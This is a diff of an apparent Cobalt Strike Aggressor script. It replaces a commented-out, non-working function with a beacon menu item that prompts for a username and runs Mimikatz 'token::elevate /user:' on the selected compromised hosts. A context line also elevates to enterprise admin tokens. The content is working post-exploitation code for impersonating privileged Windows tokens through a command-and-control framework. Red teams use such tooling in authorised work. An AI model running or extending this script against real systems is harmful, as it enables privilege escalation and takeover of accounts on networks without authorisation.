@@ -1200,21 +1200,15 @@ bmimikatz($1, "token::elevate /enterpriseadmin");
 
 }
 
+			
 
 
 
+			
 
 
 
-
-
-
-
-
-
-
-
-#########################################
+##############################################################################################
 
 
 
@@ -1222,18 +1216,15 @@ bmimikatz($1, "token::elevate /enterpriseadmin");
 
 
 
-##  Token Elevation to Custom User
+##  Token Elevation to Custom User Function - This works now!! Thanks to Steve Borosh AKA rvrsh3ll
 
 
 
-##
+## The below function will be reused in order to facilitate moar Mimikatz
 
 
 
-#########################################
-
-
-
+##############################################################################################
 
 
 
@@ -1242,151 +1233,22 @@ bmimikatz($1, "token::elevate /enterpriseadmin");
 
 
 
-		item "Elevate to Custom User Token"{
 
+        item "Elevate to Specified Token"{
 
+        prompt_text("Username:", "", lambda({
 
+                    bmimikatz($bids, "token::elevate /user:" . $1);
 
-
-
-
-			local('$bid');
-
-
-
-
-
-
-
-				foreach $bid ($1){
-
-
-
-
-
-
-
-					elevateCUSTOM($bid);
-
-
-
-
-
-
-
-				}
-
-
-
-
-
-
+                }, $bids => $1));
 
 			}
 
 
 
-			
 
 
 
-			
-
-
-
-			
-
-
-
-##############################################################################################
-
-
-
-##  
-
-
-
-##  Token Elevation to Custom User Function - This does not yet work, will fuck with later
-
-
-
-##
-
-
-
-##############################################################################################
-
-
-
-#
-
-
-
-#
-
-
-
-#
-
-
-
-#
-
-
-
-# sub elevateCUSTOM{
-
-
-
-#
-
-
-
-# bmimikatz($1, "token::elevate /$addVariable");
-
-
-
-#
-
-
-
-# }
-
-
-
-#
-
-
-
-#    dialog_description($dialog, "Please enter the Username to imitate it's token");
-
-
-
-#    drow_text($dialog, "user",  "User");
-
-
-
-#
-
-
-
-#
-
-
-
-#
-
-
-
-#
-
-
-
-#
-
-
-
-#
 
 
 
